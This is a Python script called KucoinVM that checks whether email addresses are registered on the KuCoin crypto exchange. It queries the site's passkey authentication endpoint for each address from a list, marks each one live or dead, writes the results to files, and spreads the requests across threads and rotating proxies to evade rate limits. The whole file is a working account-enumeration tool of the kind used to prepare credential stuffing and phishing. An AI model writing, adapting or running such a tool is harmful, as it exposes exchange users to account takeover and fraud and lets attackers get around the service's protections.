import requests
import json
import re
import logging
import time
import ctypes
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] | %(message)s", datefmt="%H:%M:%S")

class KucoinVM:
    def __init__(self, config: dict, emails: List[str], proxies: List[str]) -> None:
        self.config = config
        self.emails = emails
        self.proxies = proxies
        self.session = requests.Session()
        self.live_emails = []
        self.dead_emails = []
        self.done_emails = set()
        self.proxy_index = 0
        self.processed_count = 0
        self.start_time = time.time()  

    @staticmethod
    def _config() -> Tuple[dict, List[str], List[str]]:
        try:
            with open("config.json", "r") as config_file:
                config = json.load(config_file)

            with open(config["emails"], "r") as email_file:
                emails = email_file.read().splitlines()

            with open(config["proxies"], "r") as proxy_file:
                proxies = proxy_file.read().splitlines()

            valid_proxies = [
                proxy for proxy in proxies if re.match(r"^(http|https)://([A-Za-z0-9._-]+(:[A-Za-z0-9._-]+)?@)?([A-Za-z0-9.-]+):([0-9]{2,5})$", proxy)
            ]

            if not valid_proxies:
                raise ValueError("no proxies found, correct file path?.") #path_

            logging.info(f"loaded {len(emails)} emails and {len(valid_proxies)} proxies.")
            return config, emails, valid_proxies
        except FileNotFoundError as e:
            logging.error(f"file not found ->: {e}")
            raise
        except json.JSONDecodeError as e:
            logging.error(f"error with json ->: {e}")
            raise

    def mail_status(self, email: str, proxy: str) -> Tuple[str, str]:
        url = f"https://www.kucoin.com/_api/ucenter/passkey/authentication/options?account={email}&lang=en_US"

        proxies = {
            "http": proxy,
            "https": proxy
        }

        try:
            response = self.session.get(url, proxies=proxies, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if "allowCredentials" in data.get("data", {}):
                    return email, "live"
                else:
                    return email, "dead"
            else:
                logging.warning(f"??? response for {email}: {response.status_code}")
                return email, "error"
        except requests.RequestException as e:
            return email, "error"

    def _tittle(self) -> None:
        elapsed_time = time.time() - self.start_time
        cpm = (self.processed_count / elapsed_time) * 60
        cpm_rounded = int(cpm)  # round -> integer for cleaner display
        title = f"-> KucoinVM: {self.processed_count} | Live: {len(self.live_emails)} | Dead: {len(self.dead_emails)} | CPM: {cpm_rounded}"
        ctypes.windll.kernel32.SetConsoleTitleW(title)

    def _results(self, result: Tuple[str, str]) -> None:
        email, status = result
        with open("results/done.txt", "a") as done_file:
            done_file.write(email + "\n")

        if status == "live":
            self.live_emails.append(email)
            with open("results/live.txt", "a") as live_file:
                live_file.write(email + "\n")
            logging.info(f"✓ {email} | Live")
        elif status == "dead":
            self.dead_emails.append(email)
            with open("results/dead.txt", "a") as dead_file:
                dead_file.write(email + "\n")
            logging.info(f"✗ {email} | Dead")

        self.processed_count += 1
        if self.processed_count % 3 == 0:
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)

        #os title, only working for windows
        self._tittle()

    def vm_mails(self) -> None:
        try:
            with open("results/done.txt", "r") as done_file:
                self.done_emails = set(done_file.read().splitlines())
        except FileNotFoundError:
            self.done_emails = set()

        with ThreadPoolExecutor(max_workers=self.config["workers"]) as executor:
            futures = []
            for email in self.emails:
                if email not in self.done_emails:
                    proxy = self.proxies[self.proxy_index]
                    futures.append(executor.submit(self.mail_status, email, proxy))

            for future in futures:
                result = future.result()
                self._results(result)

        logging.info("vm done.")

def main() -> None:
    try:
        config, emails, proxies = KucoinVM._config()
        email_checker = KucoinVM(config, emails, proxies)
        email_checker.vm_mails()
    except ValueError as e:
        logging.error(f"error: {e}")
    except Exception as e:
        logging.error(f"??? error: {e}")

if __name__ == "__main__":
    main()
